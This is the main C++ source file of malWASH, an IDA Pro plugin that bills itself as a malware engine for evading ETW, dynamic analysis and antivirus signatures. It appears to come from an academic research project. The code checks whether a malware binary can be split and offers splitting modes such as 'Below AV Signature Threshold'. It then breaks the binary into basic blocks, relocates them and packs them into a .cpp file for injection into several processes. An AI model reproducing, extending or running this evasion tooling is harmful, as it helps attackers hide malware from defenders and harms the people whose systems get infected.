//-----------------------------------------------------------------------------------------------------------
/*
**                               ,,                                                        
**                             `7MM `7MMF'     A     `7MF' db       .M"""bgd `7MMF'  `7MMF'
**                               MM   `MA     ,MA     ,V  ;MM:     ,MI    "Y   MM      MM  
**  `7MMpMMMb.pMMMb.   ,6"Yb.    MM    VM:   ,VVM:   ,V  ,V^MM.    `MMb.       MM      MM  
**    MM    MM    MM  8)   MM    MM     MM.  M' MM.  M' ,M  `MM      `YMMNq.   MMmmmmmmMM  
**    MM    MM    MM   ,pm9MM    MM     `MM A'  `MM A'  AbmmmqMA   .     `MM   MM      MM  
**    MM    MM    MM  8M   MM    MM      :MM;    :MM;  A'     VML  Mb     dM   MM      MM  
**  .JMML  JMML  JMML.`Moo9^Yo..JMML.     VF      VF .AMA.   .AMMA.P"Ybmmd"  .JMML.  .JMML.
**     
**  malWASH - The malware engine for evading ETW and dynamic analysis: A new dimension in APTs 
**
**  ** The splitting engine ** - Version 2.0
**
**
**  main.cpp
**
**  That's the main file. It contains basic plugin functions (init, run, term), and coordinates all 
**  submodules. It also contains the "split check" functionality, that is responsible for checking whether
**  current binary can be splitted.
**
**
**  Kyriakos Ispoglou (ispo) - ispo@purdue.edu
**  June - August 2015
*/
//-----------------------------------------------------------------------------------------------------------
#include "malwash.h"                                        // all includes are here


qstrvec_t   funclist;                                       // a list of all available functions
uint        nblks, nsegms, nprocs;                          // total number of blocks, segments and processes
long long int perfcount;                                    // performance counter
//-----------------------------------------------------------------------------------------------------------
/*
**  splitchk(): Check whether splitting is possible. Note that this function is not and cannot be perfect. 
**      There are false positives and true negatives. Its output is valuable, but we should solely rely on 
**      it. Thus we haven't done much work on it, as it's not a crucial function. Note that we cannot really
**      know wheather splitting is possible unless we do the actual split. During splitting we can reveal 
**      potential issues that can make splitting infeasible.
**
**  Arguments: None.
**
**  Return Value: If function decides that splitting is possible, function returns true. Otherwise it
**      returns false.
*/
bool splitchk( void )
{
    int i = 0;                                              // global iterator
    

    msg( "[+] Checking is not very accurate. You can always comment out this function\n" );
    
    /*---------------------------------------------------------------------------------------------
    **  Check for self modifying code (W+X sections)
    **  If code modifies its own permissions at runtime, we have problem
    ---------------------------------------------------------------------------------------------*/
    msg( "    [-] Checking for self modifying code segments... " );

    for( segment_t *sgm=getnseg(0); i<get_segm_qty(); sgm=getnseg(++i) )
        if( sgm->perm == (SEGPERM_EXEC | SEGPERM_WRITE) )   // for each segment check it's permissions
        {
            char segname[MAXSEGNAMELEN] = {0};              // store segment name here

            get_segm_name(sgm, segname, MAXSEGNAMELEN);     // get segment name

            fatal( "W+X segment %s found.", segname );
            return false;                                   // failure
        }

    msg( "Done..");


    /*---------------------------------------------------------------------------------------------
    **  Check for functions that can cause problems in execution. These are functions that allocate 
    **  data within current process heap, and return pointers to it. Such examples are 
    **  get/freetaddrinfo(), etc. Note that if we know these functions, we can hook them (as we did
    **  with heap/socket* functions) copy the data into the shared memory and replace the return 
    **  pointer. Maybe in a future version  though.
    **
    **  Also function that are specific with current process can cause problems. GetProcessHeap(), 
    **  GetCurrentProcess(), etc. are such examples.
    ---------------------------------------------------------------------------------------------*/
    msg( "    [-] Checking for forbidden functions... " );

    char        fname[MAXFUNAMELEN];                        // store function name here
    const char *blacklist[] =                               // a list of functions that can cause problems
    {
        "getaddrinfo", "setaddrinfo", /* "GetProcessHeap", */
        
        // Note that we don't add function like CreateWidow() etc.
        // Such function will simply fail without causing any problems to the execution (I hope)

        /* you can add more functions here */
        0
    };

    // get all possible function names
    for(uint idx=0; idx<get_func_qty(); idx++)              // iterate over functions
    {
        get_func_name(getn_func(idx)->startEA, fname, MAXFUNAMELEN);
        
        for( i=0; blacklist[i]!=NULL; i++ )                 // for each forbidden function
            if( strstr(fname, blacklist[i] ) )              // check if it matches with imported function
            {   
                fatal( "Forbidden function %s() found", blacklist[i] );
                return false;                               // failure
            }
    }
    
    msg( "Done..\n");


    /*---------------------------------------------------------------------------------------------
    **  Another thing that we can not handle is  FILE* pointers. Although we can deal with file
    **  handles, we cannot duplicate traditional FILE* handles. Thus if malware uses functions
    **  like fopen(), fread(), ftell(), etc. splitting is not possible.
    **  However there's a quick and dirty way to deal with this problem. If we provide our own 
    **  versions of fopen() fread(), etc. and use our version instead then we'll be ok. Our 
    **  implementations will based on equivalent windows API calls, e.g. fopen() will simply call
    **  CreateFile(), fread() ReadFile(), ftell() SetFilePointer(), and so on.
    **  We can add all these functions in the above blacklist, but we'll something better:
    **  we'll get the type definition of each function and we'll search for FILE* arguments
    ---------------------------------------------------------------------------------------------*/
    msg( "    [-] Checking for unimplemented functions that use FILE* pointers... " );
    
    type_t  buf    [MAXIMPFUNDECLLEN];                      // the first 3 buffers are auxilary
    p_list  fnames [MAXIMPFUNDECLLEN];                      // 
    char    type   [MAXIMPFUNDECLLEN],                      //
            fundecl[MAXIMPFUNDECLLEN];                      // this buffer contains the function declaration
    
    
    // get all possible function names
    for(uint idx=0; idx<get_func_qty(); idx++)              // iterate over functions
    {
        get_func_name(getn_func(idx)->startEA, fname, MAXFUNAMELEN);
        
        // get type information (to arrays buf and fnames)
        // WARNING: get_ti is DERPECATED
        get_ti(getn_func(idx)->startEA, buf, MAXIMPFUNDECLLEN,  fnames, MAXIMPFUNDECLLEN );

        // print type into 1 signle line (merge buf and fnames to produce type)
        print_type_to_one_line(type, MAXIMPFUNDECLLEN, idati, buf, NULL, NULL, fnames, NULL);

        // convert type to a normal char* string
        strcpy_s(fundecl, MAXIMPFUNDECLLEN, qstrdup(type));
    
        if( strstr(fundecl, "FILE ") )                  // check if FILE is used as argument/return value
        {
            if( strstr(fname, "fopen") ||               // check if we have implement these functions
                strstr(fname, "fputc") ||
                strstr(fname, "fputs") ||
                strstr(fname, "fclose") ||
                strstr(fname, "report_gsfailure") )
                    continue;                           // if so, don't display an error


            fatal( "Found unimplemented function %s that deals with a FILE* pointer", fname );
            return false;                               // failure
        }
    }

    msg( "Done..\n");


    /*---------------------------------------------------------------------------------------------
    **  Multi-threading malware is an issue. In, current version, the process which will call 
    **  CreateThread(), will load thread code (is available in shared segments), and execute it
    **  in its address space. Although this works fine, it's not totally correct.
    **
    **  The correct solution is, when we detect a thread creation, to spawn a new malWASH instance.
    **  This will also done in future version.
    ---------------------------------------------------------------------------------------------*/


    /*---------------------------------------------------------------------------------------------
    **  TODO: Look for antidissasembly tricks
    ---------------------------------------------------------------------------------------------*/

    // You can add more checks here :)

    return true;                                            // success!
}
//-----------------------------------------------------------------------------------------------------------
int __stdcall IDAP_init(void)
{
    // Do checks here to ensure your plug-in is being used within
    // an environment it was written for. Return PLUGIN_SKIP if the     
    // checks fail, otherwise return PLUGIN_KEEP.
    return PLUGIN_KEEP;
}
//-----------------------------------------------------------------------------------------------------------
void __stdcall IDAP_term(void)
{
    // Stuff to do when exiting, generally you'd put any sort
    // of clean-up jobs here.

    /*-------------------------------------------------------------------------
    **  STEP 9. Finalize
    -------------------------------------------------------------------------*/
    visited.kill();                                         // delete netnodes from database
    segment.kill();
//  module.kill();
    invbid.kill();
    edge.kill();
    thdtab.kill();
    indfunc.kill();

    return;
}
//-----------------------------------------------------------------------------------------------------------
// The plugin can be passed an integer argument from the plugins.cfg
// file. This can be useful when you want the one plug-in to do
// something different depending on the hot-key pressed or menu
// item selected.
void __stdcall IDAP_run(int arg)
{
    // The "meat" of your plug-in
    func_t      *main;                                      // pointer to main function
    debugmode   dm;                                         // verbosity of output
    splitmode   sm;                                         // splitting algorithm
    mainstyle   ms;                                         // main function style
    int         splitsel, nprocsel, mainstyle;              // function, nprocess and main style selection
    ushort      radio, chkmask;                             // radiobutton and chkbox selection
    char        fname[MAXFUNAMELEN], tmp[8];                // plz don't overflow me :)
    qstrvec_t   nproc;                                      // a list of consequtive numbers
    uint        ninstcount;                                 // total number of instructions 
    char        args[32] = { 0 };                           // main arguments (optional)

    char dialog[] =                                         // the GUI form prototype
    {
        "STARTITEM 0\n"                                     // the 1st item gets the input focus
        "The malWASH project\n"                             // set title
        "Select main() function\n"                          // a label
        "<#main() may has a different name#:b:0:30::>\n\n"  // a dropdown list
        "Select Splitting Algorithm\n"                      // splitting algorithm label
        "<BBS - Basic Block Split (split in basic blocks):R>\n" 
        "<BAST - Below AV Signature Threshold (16 bytes) :R>\n" 
        "<Paranoid - (1 instruction per block)           :R>>\n\n"
        "<##Inject malWASH engine in:b:0:3::>process(es)\n" // another dropdown list
        "\nAdditional Options\n"                            // additional options
        "<####Display verbose output:C>\n"                  // being verbose in output
        "<####Do not delete temprorary files:C>\n"          // leave temporary file
        "<####Use Command Line Arguments:C>>\n\n"           // supply command line arugments
        "Command Line Arguments (optional)\n"               // supply command line arguments
        "<main():R><WinMain():R>>  entry function\n"
        "Enter Command Line Arugments\n<##:A:30:30::>\n"    // command line arguments
    };
    

    msg("++==============================================================++\n");
    msg("||                       _   __      __                _        ||\n");
    msg("||     _ __    __ _     | |  \\ \\    / /__ _     ___   | |_      ||\n");
    msg("||    | '  \\  / _` |    | |   \\ \\/\\/ // _` |   (_-<   | ' \\     ||\n");
    msg("||    |_|_|_| \\__,_|   _|_|_   \\_/\\_/ \\__,_|   /__/_  |_||_|    ||\n");
    msg("||   _|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|   ||\n");
    msg("||   \"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'   ||\n");
    msg("++==============================================================++\n");
    msg("||                           malWASH                            ||\n");
    msg("||   The malware engine for evading ETW and dynamic analysis    ||\n");
    msg("||                    A new dimension in APTs                   ||\n");
    msg("||                                                              ||\n");
    msg("||             The splitting engine - IDA pro Plugin            ||\n");
    msg("++==============================================================++\n");

    
    /*-------------------------------------------------------------------------
    **  STEP 1. Display GUI form to setup malWASH
    -------------------------------------------------------------------------*/
    funclist.push_back( "" );                               // start with an empty name

    // get all possible function names
    for(uint idx=0; idx<get_func_qty(); idx++)              // iterate over functions
    {
        get_func_name(getn_func(idx)->startEA, fname, sizeof(fname));
        funclist.push_back( fname );
    }
    
    // MAXCONCURNPROC
    for(uint idx=1; idx<=8; idx++)                          // iterate over functions
        nproc.push_back( _ltoa(idx, tmp, 10) );

    // set default options
    splitsel  = 0;                                          // select 1st function
    nprocsel  = 0;                                          // select injection in 1 process
    radio     = 0;                                          // default mode: BBS
    chkmask   = 0;                                          // disable verbose information and file keeping
    mainstyle = 0;                                          // select main() style

    if( AskUsingForm_c(dialog, &funclist, &splitsel, &radio, &nproc, &nprocsel, &chkmask, &mainstyle, &args) != 1 )
        return;                                             // abort on "Cancel" click

    msg( "[+] Selecting main(): %s\n", qstrdup(funclist.at(splitsel).c_str()) );
    msg( "[+] Injecting malWASH engine in %d process(es)\n", nprocsel + 1 );
    msg( "[+] Selecting splitting algorithm: " );

    switch( radio )
    {
        case 0: sm = BBS;      msg("Basic Block Split (BBS)\n");             break;
        case 1: sm = BAST;     msg("Below AV Signature Threshold (BAST)\n"); break;
        case 2: sm = PARANOID; msg("Paranoid\n");
    }

    if( chkmask & 0x01 ) {                                  // is verbose output checked?
        dm = VERY_VERBOSE; msg( "[+] Enabling " );
    }
    else {
        dm = NONE; msg( "[+] Disabling ");
    }

    msg( "verbose output information\n" );

    if( chkmask & 0x02 ) msg( "[+] Additional Options: Keeping temporary files\n" );
    else msg( "[+] Additional Options: Deleting temporary files\n");
    
    if( chkmask & 0x04 )                                    // use command line arguments?
    {
        msg( "[+] Additional Options: " );  
    
        switch( mainstyle )                                 // check main style 
        {
            case 0: ms = MAIN;    msg("Using main() style command line arguments\n\n"); break;
            case 1: ms = WINMAIN; msg("Using WinMain() style command line arguments\n\n"); 
        }
    }
    else {
        msg( "[+] Additional Options: Not using command line arguments\n");
        ms = NOTHING;                                       // no arguments
    }
    
    nprocs = nprocsel + 1;                                  // set number of processes

    /*-------------------------------------------------------------------------
    **  STEP 2. Create important netnodes
    -------------------------------------------------------------------------*/
    visited.create( "$visited", 0 );                        // create the required netnodex
    segment.create( "$segm",    0 );
    invbid.create ( "$invbid",  0 );
    edge.create   ( "$edges",   0 );
    thdtab.create ( "$thdrtn",  0 );
    indfunc.create( "$indfunc", 0 );


    /*-------------------------------------------------------------------------
    **  STEP 3. Check is splitting is possible
    -------------------------------------------------------------------------*/
    msg("[+] Checking whether splitting is possible...\n");

    if( !splitchk() ) return;

    msg("Done. Splitting is (probably) possible.\n" );
    /*-------------------------------------------------------------------------
    **  STEP 4. Locate main
    -------------------------------------------------------------------------*/
    msg("[+] Searching for main... ");
    
    //
    // * * * WARNING: "start" is not always the real entry point! * * *
    //

    // if( (main = locmain("_wWinMain@16")) == NULL ) {
    if( (main = locmain(qstrdup(funclist.at(splitsel).c_str()))) == NULL ) {
        fatal("Cannot locate main");
        return;
    }
  
    msg("Done. %s is located at 0x%x\n", qstrdup(funclist.at(splitsel).c_str()), main->startEA);

    
    /*-------------------------------------------------------------------------
    **  STEP 5a. Display GUI form to setup malWASH
    -------------------------------------------------------------------------*/
    msg("[+] Counting total number instructions... ");

    ninstcount = 0;                                                 // clear counter
    for( uint fun=0; fun<get_func_qty(); fun++ )                    // for each function
    {
        func_t* funptr = getn_func(fun);
        
        for( ea_t addr=funptr->startEA; addr<funptr->endEA; ++addr) // for each address
        {
            flags_t flags = getFlags( addr );
            
            if (isHead(flags) && isCode(flags))                     // is this code?
                ++ninstcount;
        }   
    }

    msg("Done. Program has %d instructions\n", ninstcount);
    /*-------------------------------------------------------------------------
    **  STEP 5b. Split program to basic blocks
    -------------------------------------------------------------------------*/
    msg("[+] Start splitting process..\n");
    
    funcsplit(main, sm, dm);                                // start splitting from main

    msg("[+] Splitting complete.\n");
    printbbstat(VERBOSE);

    /*-------------------------------------------------------------------------
    **  STEP 6. Do the relocations in basic blocks
    -------------------------------------------------------------------------*/
    msg("[+] Starting relocation of blocks...\n");

    if( relocblks() == ERROR ) return;                      // relocate & store blocks.
        
    msg( "[+] Relocation complete.\n" );

    /*-------------------------------------------------------------------------
    **  STEP 7. Store blocks and their metadata to disk
    -------------------------------------------------------------------------*/
    msg( "[+] Storing function table... " );
    if( storefuntab() == ERROR ) return;                    // store function table
    else msg("Done.\n" );
    msg( "[+] Function table stored.\n" );

    msg( "[+] Storing module table... " );
    if( storemodtab() == ERROR ) return;                    // store segment table
    else msg("Done.\n" );
    msg( "[+] Module table stored.\n" );

    msg( "[+] Storing segment table... " );
    if( storesegtab() == ERROR ) return;                    // store segment table
    else msg("Done.\n" );
    msg( "[+] Segment table stored.\n" );
    
    msg( "[+] Storing thread table... " );
    if( storethdtab() == ERROR ) return;                    // store thread table
    else msg("Done.\n" );
    msg( "[+] Thread table stored.\n" );

    msg( "[+} Storing other segments...\n" );
    if( storesegms() == ERROR ) return;                     // store other segments
    else msg("Done.\n" );
    msg( "[+] Rest segments stored.\n" );

    msg( "[+} Storing intialized pointer table...\n" );
    if( storeinitptrs() == ERROR ) return;                      // store initialized pointers
    else msg("Done.\n" );
    msg( "[+] Rest segments stored.\n" );

    /*-------------------------------------------------------------------------
    **  STEP 8. Pack everything to a *.cpp file
    -------------------------------------------------------------------------*/
    msg("[+] Packing everything to a *.cpp file...\n");

    if( pack( OUTFILENAME, ((chkmask & 0x02) >> 1) & 0x1, ms, args) == ERROR ) return;
        
    msg( "[+] Packing complete.\n" );

    msg( "[+] Splitting phase finished successfully.\n" );
    msg( "[+] %d blocks, %d segments will be injected to %d processes\n", nblks, nsegms, nprocs );
    msg( "[+] Final code is located at %s\n", OUTFILENAME );
    msg( "[+] Exiting... Bye bye! :)\n" );
}
//-----------------------------------------------------------------------------------------------------------
// The all-important exported PLUGIN object
plugin_t PLUGIN =
{
    IDP_INTERFACE_VERSION,                  // IDA version plug-in is written for
    0,                                      // Flags (see below)
    IDAP_init,                              // Initialisation function
    IDAP_term,                              // Clean-up function
    IDAP_run,                               // Main plug-in body
    "The malWASH project - ispo",           // Comment  unused
    "The malware engine for evading ETW and dynamic analysis: A new dimension in APTs ",
    "malWASH",                              // Plug-in name shown in Edit->Plugins menu
                                            // It can be overridden in the user's plugins.cfg file
    "Alt-S"                                 // The hot-key the user can use to run your plug-in
};
//-----------------------------------------------------------------------------------------------------------
